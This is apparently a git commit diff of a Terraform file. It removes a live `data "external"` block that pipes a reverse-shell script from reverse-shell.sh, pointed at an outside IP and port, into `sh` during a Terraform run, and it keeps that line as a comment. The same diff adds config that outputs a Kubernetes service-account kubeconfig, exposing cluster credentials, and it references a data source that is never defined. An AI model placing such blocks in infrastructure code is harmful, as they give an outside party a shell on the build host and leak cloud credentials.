895ce2f7274fb8e7b76ce741bb90f99c359243ca
raffaelemazzitelli <raffaele.mazzitelli@gmail.com>
2024-02-25 18:24:55 +0100

    later

--- tf/custom_data.tf
+++ tf/custom_data.tf
@@ -1,4 +1,17 @@
-data "external" "test" {
-  program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
+# data "external" "test" {
+#   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
+# }
+
+data "google_container_cluster" "mycluster" {
+  name     = "my-autopilot"
+  location = var.region
+}
+
+provider "kubernetes" {
+  config_context_cluster = data.google_container_cluster.mycluster.name
+}
+
+output "kubeconfig" {
+  value = data.kubernetes_service_account.default.kubeconfig
 }
 
